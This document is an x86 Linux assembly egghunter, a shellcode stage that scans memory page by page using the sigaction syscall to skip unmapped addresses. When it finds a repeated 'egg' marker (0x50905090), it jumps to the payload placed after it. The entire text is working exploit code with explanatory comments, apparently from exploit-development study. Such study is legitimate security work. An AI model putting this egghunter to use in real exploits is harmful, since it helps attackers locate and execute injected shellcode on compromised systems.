global _start

section .text
_start:

verify_area:
	or cx,0xfff ; page alignment

hunt_addr:
	inc ecx
	push 0x43 ; Syscall 67 - sigaction
	pop eax
	int 0x80

	cmp al,0xf2 ; Compare return value of the syscall against low byte of EFAULT value
	jz verify_area ; If efault is produced, i.e the memory region doesn't exist -> Loop incrementing ecx

	mov eax,0x50905090 ; Move egg in eax for SCASD operation
	mov edi,ecx ; Pointer to in-memory string to be compared moved in edi

	scasd ; Compare first part of the egg

	jnz hunt_addr ; If the egg does not match, loop incrementing the address

	scasd  ; Compare second part of the egg

	jnz hunt_addr ; Loop again if no match

	jmp edi ; Jump to the payload if match successful
